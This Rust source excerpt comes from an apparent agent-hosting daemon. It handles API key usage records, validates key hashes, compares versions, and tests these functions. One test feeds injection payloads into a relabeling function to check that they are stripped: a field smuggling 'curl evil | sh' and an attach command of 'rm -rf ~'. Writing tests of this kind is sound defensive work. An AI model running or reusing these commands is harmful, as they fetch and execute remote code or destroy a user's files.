
    /// Keeps the uses a host recorded of the keys pushed to it.
    pub(crate) fn note_key_uses(&self, host: &str, there: &[ApiKey]) {
        let mut store = self.store();
        for k in there.iter().filter(|k| k.pushed) {
            let Some(at) = k.last_used_at.as_deref().and_then(parse_rfc3339) else {
                continue;
            };
            match store.note_key_used(&k.name, &k.prefix, at) {
                Ok(true) => crate::log!("vibed: API key {} was used on {host}", k.name),
                Ok(false) => {}
                Err(e) => crate::log!("vibed: can't record {}'s use on {host}: {e}", k.name),
            }
        }
    }

    /// `keys.sync`: the keys a Mac pushed here, by their hashes, in place of
    /// those it pushed before.
    pub fn sync_keys(&self, p: KeySyncParams) -> Result<KeyList, ErrorObject> {
        let mut seen = HashMap::new();
        for k in &p.keys {
            vibe_core::model::validate_key_name(&k.name).map_err(invalid)?;
            let hex =
                k.hash.len() == 64 && k.hash.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f'));
            if !hex {
                return Err(invalid(format!(
                    "{}'s hash isn't SHA-256 in lowercase hex",
                    k.name
                )));
            }
            if seen.insert(k.hash.as_str(), ()).is_some() {
                return Err(invalid(format!("{} is pushed twice", k.name)));
            }
        }
        self.store()
            .sync_pushed_keys(p.from.as_deref().unwrap_or_default(), &p.keys)
            .map_err(store_error)?;
        // What keys saw through the Mac goes with them.
        self.peer.forget_all();
        crate::log!(
            "vibed: {} API key{} pushed here",
            p.keys.len(),
            if p.keys.len() == 1 { " is" } else { "s are" }
        );
        self.publish(self.event(EventKind::KeysChanged));
        self.keys()
    }

    /// `agents.list` for a Linux host, as dispatch gives it.
    pub(crate) async fn remote_agent_list(&self, link: &Link) -> AgentList {
        AgentList {
            agents: self.remote_agents(link).await,
        }
    }
}

/// Whether version `a` is older than `b`, by their dotted numbers: `0.1.9` is
/// older than `0.1.10`. One that isn't numbers is never older.
pub fn older(a: &str, b: &str) -> bool {
    let parse = |v: &str| {
        v.split(['.', '-', '+'])
            .take(3)
            .map(|p| p.parse::<u64>().ok())
            .collect::<Option<Vec<_>>>()
    };
    match (parse(a), parse(b)) {
        (Some(a), Some(b)) => a < b,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::remote::Ssh;

    fn ssh() -> Ssh {
        Ssh {
            program: "ssh".into(),
            bundle: None,
            shared: None,
        }
    }

    #[test]
    fn a_hosts_answers_come_under_its_name() {
        let link = Link::new("vps", "me@vps");
        let mut v = json!({"agents": [
            {"host": "local", "ref": "quiet-amber-otter", "attach": "vibe attach quiet-amber-otter",
             "status": {"activity": "done"}},
            // A host can't put rows under another's name, nor smuggle a
            // command into the line the Mac runs to attach.
            {"host": "mac", "ref": "x; curl evil | sh", "attach": "anything"},
            {"host": "elsewhere", "ref": "calm-silver-heron", "attach": "rm -rf ~"},
        ]});
        relabel(&mut v, &link, &ssh());
        assert_eq!(
            v,
            json!({"agents": [
                {"host": "vps", "ref": "quiet-amber-otter",
                 "attach": "ssh -t me@vps .local/lib/vibeos/vibe attach quiet-amber-otter",
                 "status": {"activity": "done"}},
                {"host": "vps", "ref": "calm-silver-heron",
                 "attach": "ssh -t me@vps .local/lib/vibeos/vibe attach calm-silver-heron"},
            ]})
        );
        let e = relabel_error(
            ErrorObject::new(ErrorCode::NotFound, "no project named web on local"),
            &link,
        );
        assert_eq!(e.message, "no project named web on vps");
    }

    #[test]
    fn versions_compare_by_their_numbers() {
        assert!(older("0.1.0", "0.2.0"));
        assert!(older("0.1.9", "0.1.10"));
        assert!(!older("0.2.0", "0.1.0"));
        assert!(!older("0.1.0", "0.1.0"));
        assert!(!older("weird", "0.1.0"));
    }
}
